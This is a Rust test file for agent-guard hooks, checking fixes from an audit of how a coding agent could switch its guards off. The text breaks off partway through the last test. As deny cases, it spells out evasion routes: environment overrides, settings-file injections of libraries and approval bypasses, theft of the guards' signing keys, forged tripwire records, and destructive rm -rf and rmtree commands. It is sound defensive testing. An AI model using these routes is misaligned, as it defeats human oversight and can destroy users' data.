//! Tests for the 28 Nov 2026 audit: the four ways an agent could switch the guards off (the
//! hook's environment, an unlisted program editing the site config, the hook binary, input the
//! hook could not parse), and the harmless commands the guard-config guard used to refuse.

use agentkit::guard::{self, Decision};
use agentkit::site::GuardConfig;
use serde_json::{json, Value};
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

/// A home in a temporary folder with the files the guard-config guard protects, and a guard
/// configuration that treats it as home.
fn home(tag: &str) -> (GuardConfig, PathBuf) {
    let home = std::env::temp_dir()
        .canonicalize()
        .unwrap()
        .join(format!("agentkit-audit-{tag}-{}", std::process::id()));
    let _ = fs::remove_dir_all(&home);
    for dir in [
        ".claude", ".codex", ".config/agentkit/memory", ".config/agentkit/rules/projects", ".config/fleet",
        ".local/state/agentkit", ".local/state/fleet", ".local/bin", "Projects/example/notes/topic",
        "Projects/example/.claude", "Projects/example/tests", "staging/release",
    ] {
        fs::create_dir_all(home.join(dir)).unwrap();
    }
    fs::write(home.join(".config/agentkit/agentkit.toml"), "schema = 1\n\n[guards]\ndisabled = []\n").unwrap();
    fs::write(
        home.join(".claude/settings.json"),
        "{\n  \"theme\": \"dark\",\n  \"env\": {\"EDITOR\": \"vi\"},\n  \"statusLine\": {\"type\": \"command\", \"command\": \"statusline\"},\n  \"hooks\": {\"PreToolUse\": [{\"matcher\": \"Bash\", \"hooks\": [{\"type\": \"command\", \"command\": \"agentkit hook claude all\"}]}]}\n}\n",
    )
    .unwrap();
    fs::write(home.join("Projects/example/.claude/settings.json"), "{\"permissions\": {}}\n").unwrap();
    fs::write(home.join(".codex/hooks.json"), "{}\n").unwrap();
    fs::write(home.join(".codex/config.toml"), "model = \"x\"\n").unwrap();
    for name in ["agentkit", "agent-context", "othertool"] {
        fs::write(home.join(".local/bin").join(name), "program\n").unwrap();
    }
    // A build folder with freshly built programs, as an installer would copy from.
    for name in ["agentkit", "agent-context", "guard-push"] {
        fs::write(home.join("staging/release").join(name), "program\n").unwrap();
    }
    let mut c = GuardConfig::default();
    c.home = home.clone();
    c.cwd = home.join("Projects/example");
    c.allowed_cd = agentkit::site::default_cd_roots(&c.home);
    c.air_aliases = vec!["worker".into()];
    c.air_hosts = vec!["worker.example".into()];
    c.resolve_ssh = false;
    c.offload_worker = Some(String::new());
    c.tmpdir = None;
    (c, home)
}

fn bash(cmd: &str) -> Value {
    json!({"tool_name": "Bash", "tool_input": {"command": cmd}})
}

fn config(cmd: &str, c: &GuardConfig) -> Decision {
    guard::decide_value("guard-config", &bash(cmd), c)
}

fn all(cmd: &str, c: &GuardConfig) -> Decision {
    guard::decide_all(&bash(cmd), c, guard::ALL_GUARD_NAMES)
}

fn each(c: &GuardConfig, deny: &[&str], allow: &[&str]) {
    for cmd in deny {
        let d = config(cmd, c);
        assert!(d.is_deny(), "guard-config should deny: {cmd}");
        assert!(d.reason.starts_with("Refused for `") || d.reason.contains("accept-guards"), "the refusal names no path: {cmd}: {}", d.reason);
    }
    for cmd in allow {
        let d = config(cmd, c);
        assert!(d.is_allow(), "guard-config should allow: {cmd} ({})", d.reason);
    }
}

fn file_call(tool: &str, input: Value) -> Value {
    json!({"tool_name": tool, "tool_input": input})
}

// ---- Finding 1: the hook's configuration came from its environment ----

/// The agentkit binary with an environment that can never reach the real home, whatever the
/// binary under test does with `$HOME` and the `AGENTKIT_*` variables.
fn agentkit_in(home: &Path) -> Command {
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_agentkit"));
    cmd.env("AGENTKIT_SKIP_SSH_RESOLVE", "1")
        .env("HOME", home)
        .env_remove("AGENTKIT_CONFIG")
        .env_remove("AGENTKIT_STATE")
        .env_remove("AGENTKIT_DECISIONS")
        .env_remove("AGENTKIT_BIN");
    cmd
}

/// `agentkit hook claude all` placed in a temporary tree by flags, with whatever the caller
/// puts in the environment on top.
fn hook(home: &Path, args: &[&str], envs: &[(&str, String)], payload: &[u8]) -> (String, i32) {
    let mut cmd = agentkit_in(home);
    cmd.args(args)
        .arg("--home")
        .arg(home)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    for (k, v) in envs {
        cmd.env(k, v);
    }
    let mut child = cmd.spawn().unwrap();
    child.stdin.take().unwrap().write_all(payload).unwrap();
    let out = child.wait_with_output().unwrap();
    (String::from_utf8_lossy(&out.stdout).into_owned(), out.status.code().unwrap_or(-1))
}

fn ledger_lines(home: &Path) -> Vec<Value> {
    fs::read_to_string(home.join(".local/state/agentkit/decisions.jsonl"))
        .unwrap_or_default()
        .lines()
        .filter_map(|l| serde_json::from_str(l).ok())
        .collect()
}

#[test]
fn the_hook_takes_no_config_state_or_ledger_from_its_environment() {
    let (_, home) = home("env");
    // An agent's own "config": every guard switched off. And its own "home" with the same.
    let evil = home.join("evil");
    let all_off = format!(
        "schema = 1\n\n[guards]\ndisabled = [{}]\n",
        guard::ALL_GUARD_NAMES.iter().map(|n| format!("\"{n}\"")).collect::<Vec<_>>().join(", ")
    );
    fs::create_dir_all(evil.join("home/.config/agentkit")).unwrap();
    fs::write(evil.join("agentkit.toml"), &all_off).unwrap();
    fs::write(evil.join("home/.config/agentkit/agentkit.toml"), &all_off).unwrap();
    let envs = [
        ("AGENTKIT_CONFIG", evil.display().to_string()),
        ("AGENTKIT_STATE", evil.join("state").display().to_string()),
        ("AGENTKIT_DECISIONS", "off".to_string()),
        ("HOME", evil.join("home").display().to_string()),
        // "Everything under this folder is temporary."
        ("TMPDIR", "/Users/agentkit-audit".to_string()),
    ];
    for cmd in ["rm -rf /Users/agentkit-audit/Documents/work", "rm -rf $TMPDIR/Documents/work"] {
        let call = json!({"tool_name": "Bash", "session_id": "s", "tool_input": {"command": cmd}}).to_string();
        let (out, rc) = hook(&home, &["hook", "claude", "all"], &envs, call.as_bytes());
        assert_eq!(rc, 0);
        assert!(out.contains("deny") && out.contains("hard-delete"), "{cmd}: the environment switched the guard off: {out:?}");
    }
    // Recorded in the home's own ledger, not where the environment pointed and not nowhere.
    let lines = ledger_lines(&home);
    assert_eq!(lines.len(), 2, "{lines:?}");
    assert!(lines.iter().all(|l| l["decision"] == "deny"));
    assert!(!evil.join("state").exists());
    let _ = fs::remove_dir_all(&home);
}

#[test]
fn agentkit_finds_the_account_home_in_the_user_database_not_in_home() {
    // `memory path` only prints where the notebook is; it writes nothing.
    let out = agentkit_in(Path::new("/nonexistent-agentkit-audit-home"))
        .args(["memory", "path"])
        .env("AGENTKIT_CONFIG", "/nonexistent-agentkit-audit-config")
        .output()
        .unwrap();
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    assert!(!text.contains("nonexistent-agentkit-audit"), "a path came from the environment: {text}");
    assert!(text.trim().ends_with("/.config/agentkit/memory"), "{text}");
    let account = agentkit::site::account_home().expect("the test account has a home");
    assert!(text.starts_with(&*account.to_string_lossy()), "{text}");
}

#[test]
fn another_config_is_refused_for_this_accounts_own_home() {
    let (_, home) = home("foreign");
    let evil = home.join("evil");
    fs::create_dir_all(evil.join("rules")).unwrap();
    fs::write(evil.join("agentkit.toml"), "schema = 1\n\n[guards]\ndisabled = [\"hard-delete\"]\n").unwrap();
    fs::write(evil.join("rules/core-always.md"), "x\n").unwrap();
    // No --home: the account's own. (`HOME` is set so that a binary that still obeyed it
    // would write into the temporary folder, never the real home.)
    for args in [
        vec!["sync", "--apply", "--config", evil.to_str().unwrap()],
        vec!["doctor", "--config", evil.to_str().unwrap()],
        vec!["doctor", "--state", evil.to_str().unwrap()],
        vec!["hook", "claude", "all", "--ledger", "off"],
    ] {
        let mut child = agentkit_in(&home)
            .args(&args)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        child.stdin.take().unwrap().write_all(br#"{"tool_name":"Bash","tool_input":{"command":"ls"}}"#).unwrap();
        let out = child.wait_with_output().unwrap();
        let text = format!("{}{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr));
        if args[0] == "hook" {
            // A hook that cannot place itself refuses the call.
            assert!(text.contains("deny") && text.contains("guard-setup"), "{args:?}: {text}");
        } else {
            assert_eq!(out.status.code(), Some(2), "{args:?}: {text}");
            assert!(text.contains("--home"), "{args:?}: {text}");
        }
    }
    assert!(!home.join(".claude/CLAUDE.md").exists(), "sync wrote provider files from a foreign config");
    let _ = fs::remove_dir_all(&home);
}

#[test]
fn a_tmpdir_is_judged_by_where_it_resolves_not_by_how_it_is_spelt() {
    use agentkit::site::trusted_tmp;
    let (_, base) = home("tmp");
    let elsewhere = Path::new("/Users/agentkit-audit");
    let scratch = base.join("scratch");
    let inner_home = base.join("inner-home");
    fs::create_dir_all(&scratch).unwrap();
    fs::create_dir_all(&inner_home).unwrap();
    // A real folder inside a temp root: believed, in its resolved form.
    assert_eq!(trusted_tmp(&scratch, elsewhere), Some(scratch.canonicalize().unwrap()));
    assert!(trusted_tmp(Path::new("/tmp"), elsewhere).is_some_and(|p| p == Path::new("/tmp").canonicalize().unwrap()));
    // Spelt inside a temp root, but a link that leads out of it: it is where it leads.
    let link_out = base.join("link-out");
    std::os::unix::fs::symlink("/usr/share", &link_out).unwrap();
    assert_eq!(trusted_tmp(&link_out, elsewhere), None, "a symlink out of temp was believed");
    // The home folder itself (by a link or directly), or a folder that holds it.
    let link_home = base.join("link-home");
    std::os::unix::fs::symlink(&inner_home, &link_home).unwrap();
    assert_eq!(trusted_tmp(&link_home, &inner_home), None);
    assert_eq!(trusted_tmp(&inner_home, &inner_home), None);
    assert_eq!(trusted_tmp(&base, &inner_home), None);
    // Not in a temp root at all, not resolvable, not absolute.
    assert_eq!(trusted_tmp(Path::new("/usr/share"), elsewhere), None);
    assert_eq!(trusted_tmp(&base.join("no-such-folder"), elsewhere), None);
    assert_eq!(trusted_tmp(Path::new("/tmp/../usr/share"), elsewhere), None);
    assert_eq!(trusted_tmp(Path::new("relative/tmp"), elsewhere), None);
    let _ = fs::remove_dir_all(&base);
}

#[test]
fn a_tmpdir_that_links_out_of_temp_does_not_make_its_target_temp() {
    let (_, home) = home("tmplink");
    let link = home.join("link-out");
    std::os::unix::fs::symlink("/usr/share", &link).unwrap();
    let envs = [("TMPDIR", link.display().to_string())];
    // Spelt with the variable, with the link, and with the folder itself.
    for cmd in [
        "rm -rf $TMPDIR/agentkit-audit-doc".to_string(),
        format!("rm -rf {}/agentkit-audit-doc", link.display()),
        "rm -rf /usr/share/agentkit-audit-doc".to_string(),
    ] {
        let call = json!({"tool_name": "Bash", "tool_input": {"command": cmd}}).to_string();
        let (out, _) = hook(&home, &["hook", "claude", "all"], &envs, call.as_bytes());
        assert!(out.contains("deny") && out.contains("hard-delete"), "{cmd}: {out:?}");
    }
    // A delete in a real temp folder is still allowed, by either spelling of the root.
    for cmd in ["rm -rf /tmp/agentkit-audit-ok", "rm -rf /private/tmp/agentkit-audit-ok"] {
        let call = json!({"tool_name": "Bash", "tool_input": {"command": cmd}}).to_string();
        assert_eq!(hook(&home, &["hook", "claude", "all"], &envs, call.as_bytes()).0, "", "{cmd}");
    }
    let _ = fs::remove_dir_all(&home);
}

#[test]
fn a_settings_edit_leaves_env_and_the_command_keys_as_they_are() {
    let (c, home) = home("settings");
    let settings = home.join(".claude/settings.json").display().to_string();
    let d = |v: Value| guard::decide_all(&v, &c, guard::ALL_GUARD_NAMES);
    let edit = |old: &str, new: &str| file_call("Edit", json!({"file_path": settings, "old_string": old, "new_string": new}));
    for v in [
        // the audit's chain: point the hook at another config and switch the ledger off
        edit("\"EDITOR\": \"vi\"", "\"EDITOR\": \"vi\", \"AGENTKIT_CONFIG\": \"/tmp/x\", \"AGENTKIT_DECISIONS\": \"off\""),
        // reach the hook process itself
        edit("\"EDITOR\": \"vi\"", "\"DYLD_INSERT_LIBRARIES\": \"/tmp/x.dylib\""),
        // a program that runs outside PreToolUse
        edit("\"command\": \"statusline\"", "\"command\": \"sh /tmp/x.sh\""),
        edit("\"theme\": \"dark\",", "\"theme\": \"dark\", \"apiKeyHelper\": \"/tmp/x.sh\","),
        edit("\"theme\": \"dark\",", "\"theme\": \"dark\", \"otelHeadersHelper\": \"/tmp/x.sh\","),
        // a project's settings file is read the same way
        file_call("Write", json!({"file_path": home.join("Projects/example/.claude/settings.json").display().to_string(), "content": "{\"env\": {\"AGENTKIT_CONFIG\": \"/tmp/x\"}}"})),
    ] {
        let r = d(v.clone());
        assert!(r.is_deny(), "should deny: {v}");
        assert!(r.reason.contains("settings.json"), "the refusal names no path: {}", r.reason);
    }
    // An allow-list, not a list of known-dangerous keys: keys that load code, and a key no
    // list has heard of, are refused the same way, and the refusal names the key.
    for (key, value) in [
        ("enabledPlugins", "{\"x@market\": true}"),
        ("extraKnownMarketplaces", "{\"market\": {\"source\": {\"source\": \"github\", \"repo\": \"x/y\"}}}"),
        ("enableAllProjectMcpServers", "true"),
        ("enabledMcpjsonServers", "[\"x\"]"),
        ("skipDangerousModePermissionPrompt", "true"),
        ("someKeyAFutureReleaseAdds", "{\"command\": \"sh /tmp/x.sh\"}"),
    ] {
        let r = d(edit("\"theme\": \"dark\",", &format!("\"theme\": \"dark\", \"{key}\": {value},")));
        assert!(r.is_deny(), "should deny adding {key}");
        assert!(r.reason.contains(&format!("`{key}`")), "the refusal does not name {key}: {}", r.reason);
    }
    // Removing a key is a change to it too.
    assert!(d(edit("\n  \"statusLine\": {\"type\": \"command\", \"command\": \"statusline\"},", "")).is_deny());
    for v in [
        edit("\"theme\": \"dark\"", "\"theme\": \"light\""),
        edit("\"theme\": \"dark\",", "\"theme\": \"dark\", \"permissions\": {\"allow\": [\"Bash(ls)\"]},"),
        edit("\"theme\": \"dark\",", "\"$schema\": \"https://example.invalid/settings.json\", \"theme\": \"dark\", \"model\": \"x\","),
        file_call("Write", json!({"file_path": home.join("Projects/example/.claude/settings.json").display().to_string(), "content": "{\"permissions\": {\"allow\": [\"Bash(ls)\"]}}"})),
    ] {
        let r = d(v.clone());
        assert!(r.is_allow(), "should allow: {v} ({})", r.reason);
    }
    // Codex's config is judged the same way: only the listed keys may change.
    let codex = home.join(".codex/config.toml").display().to_string();
    let codex_edit = |old: &str, new: &str| d(file_call("Edit", json!({"file_path": codex, "old_string": old, "new_string": new})));
    for (key, added) in [
        ("notify", "notify = [\"sh\", \"/tmp/x.sh\"]"),
        ("mcp_servers.x.command", "[mcp_servers.x]\ncommand = \"/tmp/x\""),
        ("approval_policy", "approval_policy = \"never\""),
        ("sandbox_mode", "sandbox_mode = \"danger-full-access\""),
        ("shell_environment_policy.set.DYLD_INSERT_LIBRARIES", "[shell_environment_policy.set]\nDYLD_INSERT_LIBRARIES = \"/tmp/x.dylib\""),
        ("profiles.quiet.notify", "[profiles.quiet]\nnotify = [\"sh\", \"/tmp/x.sh\"]"),
    ] {
        let r = codex_edit("model = \"x\"", &format!("model = \"x\"\n{added}"));
        assert!(r.is_deny(), "should deny adding {key}");
        assert!(r.reason.contains(&format!("`{key}`")), "the refusal does not name {key}: {}", r.reason);
    }
    for added in ["model_reasoning_effort = \"high\"", "personality = \"terse\"", "[profiles.quiet]\nmodel = \"y\""] {
        let r = codex_edit("model = \"x\"", &format!("model = \"z\"\n{added}"));
        assert!(r.is_allow(), "should allow: {added} ({})", r.reason);
    }
    let _ = fs::remove_dir_all(&home);
}

// ---- The guards' own keys, and tripwire's records ----

#[test]
fn the_guards_own_keys_are_not_read_copied_or_changed() {
    let (c, home) = home("keys");
    let h = home.display().to_string();
    let state = home.join(".local/state/agentkit");
    fs::write(state.join("decisions.jsonl"), "{}\n").unwrap();
    for key in ["ledger.key", "tripwire.key"] {
        fs::write(state.join(key), [7u8; 32]).unwrap();
        let p = format!("{h}/.local/state/agentkit/{key}");
        for cmd in [
            format!("cat ~/.local/state/agentkit/{key}"),
            format!("head -c 16 {p}"),
            format!("python3 -c \"print(open('{p}', 'rb').read().hex())\""),
            format!("cp {p} /tmp/agentkit-audit-key"),
            format!("base64 < {p}"),
            format!("xxd {p} | head -2"),
            "cat ~/.local/state/agentkit/*.key".to_string(),
            "grep -r . ~/.local/state/agentkit".to_string(),
            "tar czf /tmp/agentkit-audit-state.tgz ~/.local/state/agentkit".to_string(),
            format!("scp {p} worker:/tmp/"),
            format!("cd ~/.local/state/agentkit && cat {key}"),
            format!("echo x > {p}"),
            format!("rm {p}"),
        ] {
            let d = all(&cmd, &c);
            assert!(d.is_deny(), "should deny: {cmd}");
            assert!(d.reason.contains("Refused for `") && d.reason.contains(".key"), "the refusal names no key: {cmd}: {}", d.reason);
        }
        // Each of the two guards that keep the keys refuses on its own.
        for guard_name in ["secrets", "guard-config"] {
            for cmd in [format!("cat {p}"), format!("head -c 16 {p}"), format!("cp {p} /tmp/agentkit-audit-key")] {
                let d = guard::decide_value(guard_name, &bash(&cmd), &c);
                assert!(d.is_deny() && d.reason.contains(&p), "{guard_name} should deny and name the key: {cmd}: {}", d.reason);
            }
        }
        for v in [
            file_call("Read", json!({"file_path": p})),
            file_call("Grep", json!({"pattern": ".", "path": p})),
            file_call("Grep", json!({"pattern": ".", "path": format!("{h}/.local/state/agentkit")})),
            file_call("Grep", json!({"pattern": ".", "path": format!("{h}/.local/state"), "glob": "*.key"})),
            file_call("view_file", json!({"AbsolutePath": p})),
            file_call("Write", json!({"file_path": p, "content": "x"})),
        ] {
            let d = guard::decide_all(&v, &c, guard::ALL_GUARD_NAMES);
            assert!(d.is_deny() && d.reason.contains(".key"), "should deny and name the key: {v}: {}", d.reason);
        }
    }
    // The programs that use the keys in place, and ordinary reads of what sits beside them.
    for cmd in [
        "tripwire status",
        "tripwire check",
        "~/.local/bin/tripwire check --json",
        "agentkit doctor",
        "ls -la ~/.local/state/agentkit",
        "wc -c ~/.local/state/agentkit/ledger.key ~/.local/state/agentkit/tripwire.key",
        "tail -5 ~/.local/state/agentkit/decisions.jsonl | jq -r .rule",
        "grep -c deny ~/.local/state/agentkit/decisions.jsonl",
        "grep -rn tripwire ~/Projects/example",
    ] {
        let d = all(cmd, &c);
        assert!(d.is_allow(), "should allow: {cmd} ([{}] {})", d.rule, d.reason);
    }
    for v in [
        file_call("Read", json!({"file_path": format!("{h}/.local/state/agentkit/decisions.jsonl")})),
        file_call("Grep", json!({"pattern": "deny", "path": format!("{h}/.local/state/agentkit/decisions.jsonl")})),
        file_call("Grep", json!({"pattern": "tripwire", "path": format!("{h}/Projects/example")})),
        file_call("Grep", json!({"pattern": "tripwire", "path": h})),
    ] {
        let d = guard::decide_all(&v, &c, guard::ALL_GUARD_NAMES);
        assert!(d.is_allow(), "should allow: {v} ({})", d.reason);
    }
    let _ = fs::remove_dir_all(&home);
}

#[test]
fn tripwires_records_and_config_are_read_by_agents_and_written_by_tripwire_alone() {
    let (c, home) = home("tripwire");
    let h = home.display().to_string();
    fs::create_dir_all(home.join(".local/state/fleet/tripwire/incidents")).unwrap();
    fs::write(home.join(".local/state/fleet/tripwire/baseline.json"), "{}\n").unwrap();
    fs::write(home.join(".local/state/fleet/tripwire/incidents/12.json"), "{}\n").unwrap();
    fs::write(home.join(".config/fleet/tripwire.json"), "{}\n").unwrap();
    each(
        &c,
        &[
            "echo '{}' > ~/.config/fleet/tripwire.json",
            "sed -i '' 's/a/b/' ~/.config/fleet/tripwire.json",
            "jq '.exempt += [\"x\"]' ~/.config/fleet/tripwire.json | sponge ~/.config/fleet/tripwire.json",
            "rm ~/.local/state/fleet/tripwire/baseline.json",
            "cp /tmp/baseline.json ~/.local/state/fleet/tripwire/baseline.json",
            "cp /tmp/baseline.json ~/.local/state/fleet/tripwire/",
            "touch ~/.local/state/fleet/tripwire/incidents/forged.json",
            "sometool --write ~/.local/state/fleet/tripwire/incidents/12.json",
            "cd ~/.local/state/fleet/tripwire && rm baseline.json",
            &format!("python3 -c \"open('{h}/.local/state/fleet/tripwire/incidents/13.json', 'w').write('{{}}')\""),
            // the folders that hold them
            "rm -rf ~/.local/state/fleet/tripwire",
            "mv ~/.local/state/fleet/tripwire /tmp/agentkit-audit-tripwire",
            "rm -rf ~/.local/state/fleet",
            "trash ~/.config/fleet",
        ],
        &[
            // agents read the records to investigate an incident
            "cat ~/.local/state/fleet/tripwire/baseline.json",
            "jq . ~/.local/state/fleet/tripwire/incidents/12.json",
            "ls -la ~/.local/state/fleet/tripwire/incidents",
            "grep -rn BENIGN ~/.local/state/fleet/tripwire",
            "cat ~/.config/fleet/tripwire.json",
            "cp ~/.local/state/fleet/tripwire/incidents/12.json /tmp/agentkit-audit-incident.json",
            // tripwire itself, run as a program, writes its own records
            "tripwire status",
            "tripwire check",
            "tripwire release 12 --incident ~/.local/state/fleet/tripwire/incidents/12.json",
            // the folders beside them stay ordinary
            "cp /tmp/report.md ~/.local/state/fleet/",
            "mkdir -p ~/.local/state/fleet/audit && echo done > ~/.local/state/fleet/audit/run.log",
            "sometool --in-place ~/.config/fleet/placement.toml",
        ],
    );
    let d = |v: Value| guard::decide_all(&v, &c, guard::ALL_GUARD_NAMES);
    for v in [
        file_call("Write", json!({"file_path": format!("{h}/.config/fleet/tripwire.json"), "content": "{}"})),
        file_call("Edit", json!({"file_path": format!("{h}/.local/state/fleet/tripwire/baseline.json"), "old_string": "{}", "new_string": "{\"x\": 1}"})),
        json!({"tool_name": "apply_patch", "tool_input": {"input": format!("*** Begin Patch\n*** Add File: {h}/.local/state/fleet/tripwire/incidents/14.json\n+{{}}\n*** End Patch\n")}}),
    ] {
        let r = d(v.clone());
        assert!(r.is_deny() && r.reason.contains("tripwire"), "should deny and name the path: {v}: {}", r.reason);
    }
    assert!(d(file_call("Read", json!({"file_path": format!("{h}/.local/state/fleet/tripwire/baseline.json")}))).is_allow());
    assert!(d(file_call("Write", json!({"file_path": format!("{h}/.local/state/fleet/audit/notes.md"), "content": "x"}))).is_allow());
    let _ = fs::remove_dir_all(&home);
}

// ---- Finding 2: only listed writer programs were refused the site config ----

#[test]
fn any_program_that_is_not_a_reader_is_refused_a_protected_path() {
    let (c, home) = home("writers");
    let h = home.display().to_string();
    each(
        &c,
        &[
            // the audit's chain, and the others it named
            "printf '%s\\n' '/\\[guards\\]/a' 'disabled = [\"hard-delete\",\"icloud\",\"secrets\",\"guard-config\"]' . w q | ed -s ~/.config/agentkit/agentkit.toml",
            "patch ~/.config/agentkit/agentkit.toml /tmp/p.diff",
            "yq -i '.guards.disabled = [\"secrets\"]' ~/.config/agentkit/agentkit.toml",
            "GIT_WORK_TREE=~/.config/agentkit git apply /tmp/p.diff",
            "GIT_DIR=~/.config/agentkit/.git GIT_WORK_TREE=~/.config/agentkit git checkout -- .",
            "git --work-tree=$HOME/.config/agentkit apply /tmp/p.diff",
            "git apply --directory=$HOME/.config/agentkit /tmp/p.diff",
            "git config --file ~/.config/agentkit/agentkit.toml guards.disabled x",
            "git diff --output=$HOME/.codex/hooks.json",
            // any other program at all
            "sometool --in-place ~/.config/agentkit/agentkit.toml",
            "sometool --out=$HOME/.codex/hooks.json",
            "ex -s -c '%s/\\[\\]/[\"secrets\"]/' -c wq ~/.config/agentkit/agentkit.toml",
            "touch ~/.config/agentkit/guards.toml",
            "gzip ~/.config/agentkit/agentkit.toml",
            "bash /tmp/edit.sh ~/.codex/hooks.json",
            "prettier --write .claude/settings.json",
            "nohup sometool ~/.codex/hooks.json",
            "sh -c 'ed -s ~/.codex/hooks.json'",
            "ssh worker 'ed -s ~/.config/agentkit/agentkit.toml'",
            // the path reached another way
            "ed -s ~/.config/agentkit/agentkit.tom?",
            "D=~/.config/agentkit; ed -s $D/agentkit.toml",
            "ed -s \"$SOMEWHERE/.codex/hooks.json\"",
            "cd ~/.config/agentkit && ed -s agentkit.toml",
            "cd ~/.config/agentkit && patch -p1 < /tmp/p.diff",
            "for f in ~/.config/agentkit/agentkit.toml; do ed -s \"$f\" < /tmp/cmds; done",
            "echo ~/.config/agentkit/agentkit.toml | xargs truncate -s 0",
            "find ~/.config/agentkit -name '*.toml' | xargs sometool",
            "ln -s ~/.config/agentkit/agentkit.toml /tmp/alias.toml",
            // readers that can write
            "sed -n 'w /tmp/x' /tmp/new.toml; sed -n \"w $HOME/.config/agentkit/agentkit.toml\" /tmp/new.toml",
            &format!("awk '{{print > \"{h}/.config/agentkit/agentkit.toml\"}}' /tmp/new.toml"),
            "tar czf ~/.config/agentkit/agentkit.toml /tmp/src",
            "less -o ~/.codex/hooks.json /tmp/x",
            // inline scripts, on the line and as a here-document
            "python3 -c \"import pathlib; (pathlib.Path.home() / '.config/agentkit/agentkit.toml').write_text('schema = 1')\"",
            &format!("python3 - <<'EOF'\nimport pathlib\np = pathlib.Path('{h}/.config/agentkit/agentkit.toml')\np.write_text(p.read_text().replace('[]', '[\"secrets\"]'))\nEOF"),
            "python3 -c \"import shutil, os; shutil.rmtree(os.path.expanduser('~/.config'))\"",
        ],
        &[
            // reading, by any of the usual programs
            "cat ~/.config/agentkit/agentkit.toml",
            "grep -n disabled ~/.config/agentkit/agentkit.toml",
            "rg hooks ~/.claude/settings.json",
            "rg hooks ~/.claude",
            "jq '.hooks' ~/.claude/settings.json",
            "diff ~/.claude/settings.json /tmp/settings-before.json",
            "shasum -a 256 ~/.config/agentkit/agentkit.toml",
            "wc -l ~/.codex/hooks.json",
            "stat -f %m ~/.codex/config.toml",
            "ls -la ~/.config/agentkit",
            "head -20 ~/.config/agentkit/agentkit.toml | tail -5",
            "sed -n '1,5p' ~/.claude/settings.json",
            "awk '/hooks/ {print NR}' ~/.claude/settings.json",
            "sort ~/.config/agentkit/paused-providers | uniq -c",
            "python3 -m json.tool ~/.claude/settings.json",
            &format!("python3 -c \"import json; print(json.load(open('{h}/.claude/settings.json'))['hooks'])\""),
            "test -f ~/.config/agentkit/agentkit.toml && echo present",
            "if [ -f ~/.claude/settings.json ]; then echo present; fi",
            "for f in ~/.claude/settings.json ~/.codex/config.toml; do jq . \"$f\" > /dev/null; done",
            "ssh worker 'cat ~/.config/agentkit/agentkit.toml'",
            "echo ~/.config/agentkit/agentkit.toml",
            "find ~/.config/agentkit -name '*.toml' | xargs grep -n disabled",
            "du -sh ~/.config ~/.claude",
            // git commands that read or record
            "git add .claude/settings.json",
            "git diff -- .claude/settings.json",
            "git -C ~/.config/agentkit status --short",
            "git -C ~/.config/agentkit add memory && git -C ~/.config/agentkit commit -m 'notes'",
            "cd ~/.config/agentkit && git log --oneline -5",
            // copies out, archives, the open parts
            "cp ~/.config/agentkit/agentkit.toml /tmp/agentkit-backup.toml",
            "tar czf /tmp/agentkit-site.tgz ~/.config/agentkit",
            "rsync -a ~/.config/agentkit/memory/ /tmp/memory-copy/",
            "mkdir -p ~/.config/agentkit/rules/projects ~/.config/agentkit/memory/topic",
            "echo note >> ~/.config/agentkit/rules/projects/example.md",
            "sometool --write ~/.config/agentkit/memory/INDEX.md",
            "touch ~/.config/agentkit/paused-providers",
            // text that only mentions a protected path
            "agent-mail send worker:fleet 'see ~/.config/agentkit/agentkit.toml -> the disabled list'",
            "git commit -m 'guard-config: protect ~/.config/agentkit/agentkit.toml'",
            "cursor-worker 'Read ~/.claude/settings.json and report which hooks it has'",
            "echo 'edit ~/.codex/hooks.json by hand' >> notes/topic/README.md",
            // other programs, other files
            "curl -s https://example.invalid/repo/main/.claude/settings.json",
            "sometool --in-place ~/.config/fleet/placement.toml",
            "ed -s ~/Projects/example/config.toml",
        ],
    );
    let _ = fs::remove_dir_all(&home);
}

#[test]
fn a_patch_tool_and_a_command_given_as_words_are_judged() {
    let (c, home) = home("patch");
    let h = home.display().to_string();
    let d = |v: Value| guard::decide_all(&v, &c, guard::ALL_GUARD_NAMES);
    let patch = |path: &str| format!("*** Begin Patch\n*** Update File: {path}\n@@\n-disabled = []\n+disabled = [\"secrets\"]\n*** End Patch\n");
    for v in [
        json!({"tool_name": "apply_patch", "tool_input": {"input": patch(&format!("{h}/.config/agentkit/agentkit.toml"))}}),
        json!({"tool_name": "apply_patch", "tool_input": {"patch": patch(&format!("{h}/.codex/hooks.json"))}}),
        json!({"tool_name": "apply_patch", "cwd": format!("{h}/.config/agentkit"), "tool_input": {"command": ["apply_patch", patch("agentkit.toml")]}}),
        json!({"tool_name": "apply_patch", "tool_input": {"input": format!("*** Begin Patch\n*** Add File: {h}/work/APPROVE_DEPLOY\n+ok\n*** End Patch\n")}}),
        json!({"tool_name": "apply_patch", "tool_input": {"input": format!("*** Begin Patch\n*** Update File: /tmp/a.txt\n*** Move to: {h}/.local/bin/agentkit\n*** End Patch\n")}}),
        // a shell tool whose command is a list of words
        json!({"tool_name": "shell", "tool_input": {"command": ["bash", "-lc", "echo x >> ~/.config/agentkit/agentkit.toml"]}}),
        json!({"tool_name": "exec_command", "tool_input": {"command": ["rm", "-rf", "/Users/agentkit-audit/Documents/work"]}}),
    ] {
        assert!(d(v.clone()).is_deny(), "should deny: {v}");
    }
    for v in [
        json!({"tool_name": "apply_patch", "tool_input": {"input": patch(&format!("{h}/Projects/example/src/main.rs"))}}),
        json!({"tool_name": "apply_patch", "tool_input": {"input": patch(&format!("{h}/.config/agentkit/memory/INDEX.md"))}}),
        json!({"tool_name": "mcp__search__query", "tool_input": {"query": "how does *** Update File: work"}}),
        json!({"tool_name": "shell", "tool_input": {"command": ["bash", "-lc", "ls -la"]}}),
    ] {
        let r = d(v.clone());
        assert!(r.is_allow(), "should allow: {v} ({})", r.reason);
    }
    let _ = fs::remove_dir_all(&home);
}

// ---- Finding 3: the hook binary was found on PATH and nothing protected it ----

#[test]
fn generated_hooks_name_their_programs_by_absolute_path() {
    let (_, home) = home("abs");
    fs::create_dir_all(home.join(".config/agentkit/rules")).unwrap();
    fs::write(home.join(".config/agentkit/agentkit.toml"), "schema = 1\n").unwrap();
